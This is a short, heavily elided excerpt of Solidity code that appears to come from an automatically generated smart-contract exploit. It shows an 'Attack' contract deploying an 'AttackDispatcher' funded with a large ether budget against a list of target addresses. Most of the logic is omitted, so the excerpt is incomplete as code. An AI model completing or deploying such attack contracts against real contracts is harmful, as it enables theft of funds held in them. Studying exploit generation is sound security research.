 ...
 * parameter. Make sure to send at least 727876 ether and 360770741650587649 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                ...
                uint value = 0x9a2241af62c000000000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x9a2241af62c000000001; /* equals 727876 ether and 360770741650587649 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[4] = new AttackDispatcher{value: 727876360770741650587648 }(4, _targets);
    }
